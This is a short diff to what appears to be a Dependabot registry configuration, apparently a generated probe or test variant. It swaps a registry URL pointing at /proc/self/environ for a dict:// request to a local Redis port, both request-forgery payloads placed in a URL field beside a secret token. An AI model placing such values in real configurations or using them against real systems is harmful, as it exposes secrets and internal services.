@@ -1,9 +1,9 @@
-# p7r p9b_9_2 1790582815
+# p7r p9b_9_3 1790582950
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: file:///proc/self/environ
+    url: dict://127.0.0.1:6379/info
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
